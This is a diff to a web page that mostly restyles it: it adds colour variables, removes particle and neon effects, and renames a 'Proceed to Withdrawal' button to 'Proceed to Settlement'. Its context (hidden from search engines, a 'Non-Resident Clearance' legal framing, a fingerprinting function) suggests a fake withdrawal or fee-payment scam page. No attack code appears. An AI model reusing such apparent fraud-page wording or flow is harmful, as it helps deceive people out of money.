@@ -5,13 +5,20 @@
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <style>
-        body { 
+                :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --accent-red: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --btn-green: #10b981;
+            --btn-green-hover: #059669;
+        }
+body { 
             font-family: 'Georgia', sans-serif;  
             /* Amplified color glow values with intense centers blending to deep black */
-            background: radial-gradient(circle at 15% 25%, #4c1d95 0%, #1e1b4b 25%, transparent 60%),
-                        radial-gradient(circle at 85% 75%, #005f73 0%, #0a2f35 30%, transparent 60%),
-                        #05070a;
-            background-size: 180% 180%;
+                    background-color: var(--bg-color);
             animation: ambientPulse 10s ease-in-out infinite;
             color: #c9d1d9; 
             display: flex;
@@ -310,11 +317,22 @@
 <!-- THE ENGINE SCRIPT: Put this right before your closing body tag -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.min.js"></script>
 <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --accent-red: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --btn-green: #10b981;
+            --btn-green-hover: #059669;
+        }
+
 /* ---------- Base ---------- */
 body {
           font-family: 'Georgia', sans-serif;  
   margin: 0;
-  background: #0d0d0d;
+          background-color: var(--card-bg);
   color: #fff;
   overflow-x: hidden;
 }
@@ -376,46 +394,7 @@ font-weight: bold;
         100% { left: 100%; }
     }
 
-        /* ---------- Floating Background ---------- */
-#floating-bg {
-    position: fixed;
-    inset: 0;
-    z-index: 0;
-    pointer-events: none;
-
-    /* Soft white/blue futuristic background */
-    background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
-
-    overflow: hidden;
-}
-
-.particle {
-    position: absolute;
-    border-radius: 50%;
-    opacity: 0.6;
-
-    animation: floatParticles linear infinite;
-
-    /* Soft futuristic glow */
-    background: rgba(120, 180, 255, 0.7);
-    box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
-}
-
-@keyframes floatParticles {
-    0% {
-        transform: translateY(100vh) scale(0.3);
-        opacity: 0;
-    }
-
-    50% {
-        opacity: 1;
-    }
-
-    100% {
-        transform: translateY(-10vh) scale(1);
-        opacity: 0;
-    }
-}
+        
 
 /* ---------- Header ---------- */
 header {
@@ -537,55 +516,6 @@ button:hover {
   background: rgba(107,44,216,0.8);
 }
 
-/* Neon glass card */
-.neon-card {
-  background: rgba(107,44,216,0.15);
-  backdrop-filter: blur(12px);
-  border-radius: 18px;
-  padding: 24px;
-  box-shadow: 
-    0 0 10px rgba(107,44,216,0.5),
-    0 0 20px rgba(107,44,216,0.4),
-    0 0 40px rgba(107,44,216,0.3),
-    0 0 80px rgba(107,44,216,0.2);
-  max-width: 600px;
-  margin: 10px auto 40px;
-  position: relative;
-  animation: neonPulse 2.5s ease-in-out infinite alternate;
-  overflow: hidden;
-}
-
-/* Inner glow */
-.neon-card::before {
-  content: '';
-  position: absolute;
-  inset: 2px;
-  border-radius: 16px;
-  border: 2px solid rgba(107,44,216,0.6);
-  box-shadow:
-    0 0 10px rgba(107,44,216,0.8),
-    0 0 20px rgba(107,44,216,0.6),
-    0 0 30px rgba(107,44,216,0.4);
-  pointer-events: none;
-  z-index: 0;
-  animation: innerPulse 2.5s ease-in-out infinite alternate;
-}
-
-/* Purple halo behind card */
-.neon-card::after {
-  content: '';
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  width: 120%;
-  height: 120%;
-  background: radial-gradient(circle, rgba(107,44,216,0.4) 0%, transparent 70%);
-  transform: translate(-50%, -50%) scale(1);
-  border-radius: 50%;
-  z-index: -1; /* behind card content */
-  animation: haloPulse 2.5s ease-in-out infinite alternate;
-  pointer-events: none;
-}
 
 /* Red warning glow */
 .neon-card.warning {
@@ -593,22 +523,6 @@ button:hover {
   box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
 }
 
-/* Pulsing neon animations */
-@keyframes neonPulse {
-  0% { box-shadow: 0 0 10px rgba(107,44,216,0.4),0 0 20px rgba(107,44,216,0.3),0 0 40px rgba(107,44,216,0.2); }
-  50% { box-shadow: 0 0 20px rgba(107,44,216,0.8),0 0 40px rgba(107,44,216,0.6),0 0 60px rgba(107,44,216,0.4); }
-  100% { box-shadow: 0 0 10px rgba(107,44,216,0.4),0 0 20px rgba(107,44,216,0.3),0 0 40px rgba(107,44,216,0.2); }
-}
-@keyframes innerPulse {
-  0% { box-shadow: 0 0 5px rgba(107,44,216,0.5),0 0 10px rgba(107,44,216,0.4),0 0 15px rgba(107,44,216,0.3); }
-  50% { box-shadow: 0 0 15px rgba(107,44,216,0.8),0 0 25px rgba(107,44,216,0.6),0 0 35px rgba(107,44,216,0.4); }
-  100% { box-shadow: 0 0 5px rgba(107,44,216,0.5),0 0 10px rgba(107,44,216,0.4),0 0 15px rgba(107,44,216,0.3); }
-}
-@keyframes haloPulse {
-  0% { transform: translate(-50%, -50%) scale(1); opacity:0.5; }
-  50% { transform: translate(-50%, -50%) scale(1.15); opacity:0.7; }
-  100% { transform: translate(-50%, -50%) scale(1); opacity:0.5; }
-}
 @keyframes warning-glow {
   0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
   50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
@@ -620,9 +534,6 @@ button:hover {
 </head>
 
 <body>
-
-<!-- Floating Background -->
-<div id="floating-bg"></div>
 
 <div id="planNotification" class="notification-bar"></div>
 
@@ -675,7 +586,7 @@ Financial Framework (Section 4B - Non-Resident Clearance) and Section 153 of the
 
        <!-- Navigation Buttons -->
 <div id="submitBtn" style="max-width:600px;margin:40px auto 100px; display:flex;justify-content:flex-end; position:relative; z-index:5;">
-    <button id="nextBtnSeparate" style="background: rgba(107,44,216,0.9); border:1px solid #fff; padding:12px 24px; border-radius:12px; font-weight:bold; color:#fff;">Proceed to Withdrawal</button>
+    <button id="nextBtnSeparate" style="background: rgba(107,44,216,0.9); border:1px solid #fff; padding:12px 24px; border-radius:12px; font-weight:bold; color:#fff;">Proceed to Settlement</button>
 </div>
 
 <script>
@@ -1146,31 +1057,6 @@ SESSION GUARD (CLEANED)
 
 })();
 
-
-/* ---------- BEST CASE FLOATING PARTICLES BG ---------- */
-const particleContainer = document.getElementById('floating-bg');
-const particleColors = ['#6b2cd8', '#9b59b6', '#8e44ad'];
-
-if (particleContainer) {
-    const particleCount = window.innerWidth < 600 ? 30 : 60; // Responsive count optimization
-    const fragment = document.createDocumentFragment();
-
-    for (let i = 0; i < particleCount; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        
-        const size = Math.random() * 18 + 8;
-        p.style.width = size + 'px';
-        p.style.height = size + 'px';
-        p.style.left = Math.random() * 100 + 'vw';
-        p.style.background = `radial-gradient(circle, ${particleColors[Math.floor(Math.random() * particleColors.length)]}, transparent)`;
-        p.style.animationDuration = (Math.random() * 15 + 10) + 's';
-        p.style.animationDelay = (Math.random() * 5) + 's';
-        
-        fragment.appendChild(p);
-    }
-    particleContainer.appendChild(fragment);
-}
 
 /* Navigation logic */
 function getFingerprint() {
